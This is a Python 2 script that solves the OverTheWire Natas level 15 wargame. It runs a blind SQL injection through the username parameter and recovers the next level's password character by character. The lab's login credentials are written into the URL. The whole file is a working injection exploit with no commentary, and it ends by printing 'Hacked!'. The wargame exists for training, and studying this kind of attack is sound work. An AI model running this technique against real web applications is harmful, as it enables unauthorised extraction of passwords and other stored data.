#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
charexist = ''
password = ''

target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'

userexists = 'This user exists.'

r = requests.get(target)

if r.status_code:
	print r.status_code
	#print r.text
	
for c in chars:
	r = requests.get(target + '?username=natas16" and password like binary "%' + c + '%" "')
	if r.content.find(userexists) != -1:
		charexist += c
		print charexist
	
print 'Characters used in password: ' + charexist

for i in range(32):
	for c in charexist:
		r = requests.get(target + '?username=natas16" and password like binary "' + password + c + '%" "')
		if r.content.find(userexists) != -1:
			password += c
			print password
			break
			
print 'Final password: ' + password
print 'Hacked!'
		
	
